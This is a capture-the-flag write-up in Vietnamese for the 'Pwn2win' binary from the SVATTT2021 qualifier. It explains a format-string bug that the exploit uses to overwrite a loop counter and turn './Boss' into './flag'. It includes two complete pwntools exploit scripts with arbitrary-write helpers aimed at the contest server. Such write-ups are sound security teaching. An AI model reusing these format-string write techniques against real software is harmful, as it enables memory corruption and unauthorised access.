# Pwn2win
* cre: Nyancat


# Reverse File

Xem một số thông tin cơ bản của file: kiến trúc 64-bit, dynamically linked và stripped
```sh
kimetsu_no_yaiba: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=92e404195e539fc8cbce6c8b55af37adc01cec4d, stripped
```
Kiểm tra 1 số cơ chế bảo mật.
```sh
[*] '/mnt/c/Users/n18dc/OneDrive/Desktop/SVATTT2021/Vòng sơ khảo/Pwn2win/kimetsu_no_yaiba'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Chương trình sẽ cho 3 lần thi đấu với boss khác nhau về: máu, tấn công và phòng thủ.
Trước khi đấu với 1 boss bất kỳ, người chơi sẽ cung cấp 1 chuỗi với độ dài 16 byte.
Khi đấu với boss sẽ có 2 phương pháp tấn công:
* Normal attack - sử dụng attack cơ bản của người chơi
* Skill - sử dụng kỹ năng, luôn thắng boss.

Khi tấn công thất bại, người chơi sẽ bị mất 1 lượng máu. Ngược lại, nếu tấn công thành công thif Boss cũng sẽ bị mất máu.

Khi đánh bại 1 boss, sẽ tới phần bị lỗi format string
```sh
printf("WINNER: ");
printf(s);
puts("\nCongratulation");
```

Khi hết 3 lượt đánh boss, người chơi chiến thắng sẽ được in ra text của file hint.txt

```sh
puts("Wow, Amazing");
puts("I will send you some prizes\nSee you soon");
stream = fopen("./hint.txt", "r");
fread(ptr, 0x1EuLL, 1uLL, stream);
puts(ptr);
exit(0);
```


# Exploit

Chương trình sử dụng biến i để so sánh, cho đấu với 3 boss, mà i nằm trên stack, nên sẽ đè biến i thành số âm, người chơi sẽ thực hiện được nhiều lần thi đấu để tấn công format string.

Sau đó thực thi ghi đè chuỗi "./flag" thay thế cho chuỗi "./Boss", thì lúc đọc thông tin boss, chương trình sẽ đọc luôn cho mình flag.

file exploit
```sh
#!/usr/bin/env python3
#cre: nyancat0131
from pwn import *

context.clear(arch='amd64', os='linux', endian='little')

r = remote('125.235.240.166', 33333)

# 1st boss
r.sendline(b'%p')

for i in range(6):
    r.sendlineafter(b'> ', b'2')
    r.sendline(str(0x11111111).encode('ascii'))

r.recvuntil(b'WINNER: ')
stack = int(r.recvline(), 16) + 0x2720
log.info('stack = 0x%x' % stack)

def fight(fmt):
    r.sendlineafter(b'(y/n) ', b'y')
    r.sendline(fmt.encode('ascii'))

    for i in range(8):
        r.sendlineafter(b'> ', b'2')
        r.sendline(str(0x11111111).encode('ascii'))

# 2nd boss
fight('%{:d}c%25$hn'.format((stack - 0x70 + 3) & 0xffff))

# 3rd boss
fight('%128c%53$hhn')

# loop variable has been set to a negative number
# now we have unlimited tries

def write(addr, value):
    log.info('Writing 0x%x to 0x%x', value, addr)
    for j in range(0, 8, 2):
        fight('%{:d}c%25$hn'.format((stack - 0x30 + j) & 0xffff))
        if (addr & 0xffff) == 0:
            fight('%53$hn')
        else:
            fight('%{:d}c%53$hn'.format(addr & 0xffff))
        addr = addr >> 16
    
    value = value & 0xffff
    if value == 0:
        fight('%16$hn')
    else:
        fight('%{:d}c%16$hn'.format(value))

write(0x602098 + 7, u16(b'./'))
write(0x602098 + 9, u16(b'fl'))
write(0x602098 + 11, u16(b'ag'))
write(stack - 0x74, 0)

r.sendlineafter(b'(y/n) ', b'y')
r.recvuntil(b'Name: ')
log.success(r.recvline().decode('ascii').strip())
```

## Cách thứ 2: Ghi dè "./Boss" --> "./flag" bằng việc tính địa chỉ ghi đè, tương ứng với máu của người chơi.
file exploit
```sh
# -*- coding: utf-8 -*-
from pwn import *
import sys
class info:
    def __init__(self, name,health,dame,defend):
        self.name = name
        self.health = health
        self.dame = dame
        self.defend = defend
    
    def set_user(self):
        self.name = ''
        self.health = 0x7ffffffe
        self.dame = 0x2000
        self.defend = 0x1000

host = '127.0.0.1'
port = 1234
flag = "lfga".encode('hex')
addr_boss = 0x60209a

def fight(r, payload, user, boss, mode,addr_boss):
    print(r.recvuntil("Let's give your name before the fight: "))
    r.send(payload)
    remain = skill = 0
    if mode == 'lose':
        while True:
            if (skill < 3):
                skill += 1
                dame_boss = boss.dame
            else:
                skill = 0
                dame_boss = boss.dame*2
            print(r.recvuntil("> "))
            r.sendline('1')
            user.health = user.health - dame_boss + user.defend
            print('[*] health : {}'.format(user.health))
            if user.health < 0:
                break
    else:
        while True:
            dame = user.dame
            defend = user.defend
            print(r.recvuntil("> "))
            if (skill < 3):
                skill += 1
                dame_boss = boss.dame
            else:
                skill = 0
                dame_boss = boss.dame*2
            remain = user.health - dame_boss + defend
            if remain < addr_boss:
                dame = (addr_boss - remain)*2
                print('[*] Dame : {:x}'.format(dame))
                if dame <= boss.defend:
                    dame += boss.defend

                defend += dame/2
                user.health = user.health - dame_boss + defend
                r.sendline('2')
                r.sendline(str(dame))
                print('[*] health : {:x}'.format(user.health))
                if user.health == addr_boss:
                    n = 1
                    health = 0
                    while True:
                        health = boss.health - 0x11111111*n
                        if health < 0:
                            break
                        else:
                            n += 1
                    for _ in range(n):
                        print(r.recvuntil("> "))
                        r.sendline('2')
                        r.sendline(str(0x11111111))
                    break
                else:
                    continue
            else:
                r.sendline('1')
                user.health = user.health - dame_boss + defend
                print('[*] health : {:x}'.format(user.health))
            
def exploit(debug):
    if debug == '1':
        r = process('./kimetsu_no_yaiba1')
        gdb.attach(r,'''
        b*0x400ff9
        ''')
    else:
        # r = process('./kimetsu_no_yaiba')
        # r = remote(host,port)
        r = remote('125.235.240.166',33333)

    akaza = info("Akaza",1610612736,400000,200000)
    muzan = info("Kibutsuji_Muzan",2147483647,1000000,500000)
    user = info("tod",0x7ffffffe,0x2000,0x1000)

    print("==============LEVEL 1==============")
    payload = "%{}x%12$hn".format(str(int(flag[:4],16)))
    payload = payload.ljust(16,'a')
    fight(r,payload,user,akaza,'win',addr_boss)
    print(r.recvuntil("(y/n) "))
    r.sendline('y')
    print("==============LEVEL 2==============")
    payload = "%{}x%12$hn".format(str(int(flag[4:8],16)))
    payload = payload.ljust(16,'a')
    user.set_user()
    fight(r,payload,user,muzan,'win',addr_boss+2)
    print(r.recvuntil("(y/n) "))
    r.sendline('y')
    print("==============LEVEL 3==============")
    user.set_user()
    fight(r,'zir',user,muzan,'lose',addr_boss)
    print(r.recvuntil("(y/n) "))
    r.sendline('y')
    print(r.recvuntil("==========================="))
    r.close()
exploit(sys.argv[1])
```